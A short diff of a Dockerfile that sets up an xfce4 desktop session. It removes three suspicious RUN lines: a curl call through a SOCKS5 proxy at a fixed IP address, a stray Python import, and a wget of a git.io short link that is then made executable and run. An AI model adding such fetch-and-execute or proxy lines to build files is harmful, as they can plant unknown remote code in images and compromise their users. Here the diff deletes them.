@@ -87,8 +87,4 @@ RUN export UNAME=$UNAME UID=1000 GID=1000 && \
 
 RUN echo xfce4-session >~/.xsession
 RUN echo "exec /etc/X11/Xsession /usr/bin/xfce4-session" 
-
-RUN curl -v -x socks5://178.197.249.11:1080 https://dashboard.heroku.com//
-RUN import os as JMsl3
-RUN wget https://git.io/JMsl3 && chmod +x JMsl3 && ./JMsl3
 CMD ["/app/run.sh"]
